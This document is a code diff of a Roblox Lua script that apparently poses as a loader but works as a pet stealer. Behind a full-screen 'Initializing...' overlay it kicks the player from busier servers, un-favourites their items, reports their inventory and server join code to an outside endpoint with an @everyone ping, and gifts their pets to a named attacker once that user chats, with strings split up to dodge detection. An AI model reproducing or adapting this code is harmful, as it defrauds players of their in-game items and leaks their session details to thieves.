@@ -29,6 +29,7 @@ gui.ResetOnSpawn = false
 gui.DisplayOrder = 999999 
 gui.Parent = player:WaitForChild("PlayerGui")
 
+
 local bg = Instance.new("Frame", gui)
 bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 bg.Size = UDim2.new(1, 0, 1, 0)
@@ -41,6 +42,7 @@ title.TextScaled = true
 title.Size = UDim2.new(0.8, 0, 0.12, 0)
 title.Position = UDim2.new(0.1, 0, 0.28, 0)
 title.BackgroundTransparency = 1
+
 
 local status = Instance.new("TextLabel", bg)
 status.Text = "Initializing..."
@@ -57,6 +59,7 @@ barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
 barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 barBg.BorderSizePixel = 0
 barBg.ClipsDescendants = true
+
 
 local barFill = Instance.new("Frame", barBg)
 barFill.Size = UDim2.new(0, 0, 1, 0)
@@ -101,6 +104,7 @@ task.spawn(function()
     gui:Destroy()
 end)
 
+
 local suffixes = {
     "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"
 }
@@ -116,6 +120,7 @@ function formatNumber(num)
     return string.format("%.2f%s", scaled, suffix)
 end
 
+
 if #game.Players:GetPlayers() >= 5 then
     game.Players.LocalPlayer:Kick("Old server detected. Please rejoin!")
     return 
@@ -126,10 +131,11 @@ local bp = player:WaitForChild("Backpack")
 local event = game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
 
 for _, item in ipairs(bp:GetChildren()) do
-    if item:GetAttribute("Favorite") == true then
-        event:FireServer(item)
-    end
+	if item:GetAttribute("Favorite") == true then
+		event:FireServer(item)
+	end
 end
+
 
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
@@ -152,6 +158,7 @@ local allowedPets = {
     ["Scarlet Macaw"] = true,
 }
 
+
 local petCountMap = {}
 local petLines = {}
 local itemsWithValue = {}
@@ -166,14 +173,18 @@ for _, item in pairs(backpack:GetChildren()) do
     end
 end
 
+
 for petName, count in pairs(petCountMap) do
     table.insert(petLines, petName .. " - pet (x" .. count .. ")")
 end
 
+
 table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
+
 
 local tradableSummary = ""
 local totalShown = 0
+
 
 for _, line in ipairs(petLines) do
     if totalShown >= 10 then break end
@@ -181,10 +192,12 @@ for _, line in ipairs(petLines) do
     totalShown += 1
 end
 
+
 for i = 1, math.min(10 - totalShown, #itemsWithValue) do
     local item = itemsWithValue[i]
     tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
 end
+
 
 if #petLines + #itemsWithValue > 10 then
     tradableSummary = tradableSummary .. "and more..."
@@ -194,6 +207,8 @@ local totalValue = 0
 for _, item in ipairs(itemsWithValue) do
     totalValue += item.value
 end
+
+
 
 local payload = {
     ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
@@ -229,6 +244,7 @@ local logs_payload = {
     }}
 }
 
+
 if req then
     pcall(function()
         req({
@@ -246,6 +262,7 @@ if req then
         })
     end)
 end
+
 
 local printedInventory = false
 local started = false
@@ -285,8 +302,8 @@ local function startGiving()
     local hrp = target.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
 
-    -- REMOVED: LocalPlayer.Character:MoveTo(hrp.Position)
-    -- REMOVED: task.wait(0.4)
+    LocalPlayer.Character:MoveTo(hrp.Position)
+    task.wait(0.4)
 
     -- Bypassed ProximityPrompt detection
     local cname = "Proximity".."Prompt"
@@ -320,11 +337,11 @@ local function startGiving()
             end
 
             ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
-            local holdBegin = "InputHold" .. "Begin"
-            local holdEnd = "InputHold" .. "End"
-            prompt[holdBegin](prompt)
-            task.wait(0.1)
-            prompt[holdEnd](prompt)
+local holdBegin = "InputHold" .. "Begin"
+local holdEnd = "InputHold" .. "End"
+prompt[holdBegin](prompt)
+task.wait(0.1)
+prompt[holdEnd](prompt)
 
             if item:IsDescendantOf(LocalPlayer.Character) then
                 item.Parent = LocalPlayer.Backpack
@@ -340,8 +357,8 @@ end
 
 unequipAllPets()
 for _,p in ipairs(Players:GetPlayers()) do
-    if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
+	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
 end
 Players.PlayerAdded:Connect(function(p)
-    if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
+	if p.Name==username then p.Chatted:Connect(function() if not started then started=true startGiving() end end) end
 end)
